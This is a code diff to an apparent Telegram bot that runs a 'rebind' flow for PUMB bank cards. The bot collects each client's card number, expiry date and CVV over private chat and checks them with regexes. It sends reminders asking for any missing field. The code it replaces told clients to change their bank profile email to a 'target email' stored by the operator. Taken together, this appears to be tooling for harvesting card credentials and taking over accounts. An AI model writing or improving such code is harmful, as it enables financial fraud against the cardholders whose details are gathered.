@@ -2056,33 +2056,38 @@ async def _delayed_pumb_rebind_process(client_id: int, chat_id: int, state: FSMC
             )
 
 
-async def _delayed_pumb_card_details_process(client_id: int, state: FSMContext, bot: Bot):
+async def _prompt_missing_pumb_card_details(client_id: int, state: FSMContext, bot: Bot):
     try:
-        await asyncio.sleep(2.5)
+        await asyncio.sleep(12.0)
         if await state.get_state() != RegistrationStates.pumb_rebind_card_details:
             return
 
         data = await state.get_data()
         card_lines = data.get("pumb_card_details_lines", [])
-        if not card_lines:
-            return
+        combined = "\n".join(card_lines)
 
-        combined_text = "\n".join(card_lines)
-        await state.update_data(pumb_card_details_text=combined_text)
+        has_card_num = bool(re.search(r'\b(?:\d[ -]*?){13,19}\b', combined))
+        has_expiry = bool(re.search(r'\b(?:0[1-9]|1[0-2])[/.\-](?:2[4-9]|3[0-9]|202[4-9]|203[0-9])\b', combined))
+        has_cvv = bool(re.search(r'\b\d{3}\b', combined))
 
-        target_email = await db.get_pumb_target_email()
-        await state.set_state(RegistrationStates.pumb_rebind_anketa_screenshot)
-        await bot.send_message(
-            chat_id=client_id,
-            text=(
-                f"Змініть анкетні дані та пошту\n\n"
-                f"• Вкажіть пошту: {target_email}"
+        if not (has_card_num and has_expiry and has_cvv):
+            missing = []
+            if not has_card_num:
+                missing.append("Номер картки")
+            if not has_expiry:
+                missing.append("Термін дії (мм/рр)")
+            if not has_cvv:
+                missing.append("CVV код (3 цифри)")
+
+            missing_str = ", ".join(missing)
+            await bot.send_message(
+                chat_id=client_id,
+                text=f"Будь ласка, надішліть також недостатні дані: {missing_str}."
             )
-        )
     except asyncio.CancelledError:
         return
     except Exception as e:
-        logger.error(f"Помилка затримки збору реквізитів картки ПУМБ: {e}")
+        logger.error(f"Помилка нагадування реквізитів картки ПУМБ: {e}")
 
 
 @router.message(RegistrationStates.pumb_rebind_card_details, F.chat.type == "private")
@@ -2100,11 +2105,11 @@ async def process_pumb_rebind_card_details(message: Message, state: FSMContext, 
     await state.update_data(pumb_card_details_lines=card_lines)
 
     combined = "\n".join(card_lines)
-    has_card_num = bool(re.search(r'\d{13,19}', combined))
-    has_expiry = bool(re.search(r'\d{2}[/.\-]\d{2}', combined))
+    has_card_num = bool(re.search(r'\b(?:\d[ -]*?){13,19}\b', combined))
+    has_expiry = bool(re.search(r'\b(?:0[1-9]|1[0-2])[/.\-](?:2[4-9]|3[0-9]|202[4-9]|203[0-9])\b', combined))
     has_cvv = bool(re.search(r'\b\d{3}\b', combined))
 
-    # Якщо вже є всі 3 реквізити (номер, термін, CVV), обробляємо миттєво
+    # Переходимо на наступний крок ТІЛЬКИ коли зібрано ВСІ 3 реквізити (Номер + Термін + CVV)
     if has_card_num and has_expiry and has_cvv:
         existing = _pumb_card_tasks.pop(client_id, None)
         if existing and not existing.done():
@@ -2119,13 +2124,13 @@ async def process_pumb_rebind_card_details(message: Message, state: FSMContext, 
         )
         return
 
-    # Інакше чекаємо 2.5 секунди на випадок, якщо клієнт надсилає термін дії та CVV окремими повідомленнями
+    # Якщо ще не всі реквізити надійшли, чекаємо наступні повідомлення (з нагадуванням через 12 сек)
     existing = _pumb_card_tasks.pop(client_id, None)
     if existing and not existing.done():
         existing.cancel()
 
     task = asyncio.create_task(
-        _delayed_pumb_card_details_process(client_id, state, bot)
+        _prompt_missing_pumb_card_details(client_id, state, bot)
     )
     _pumb_card_tasks[client_id] = task
 
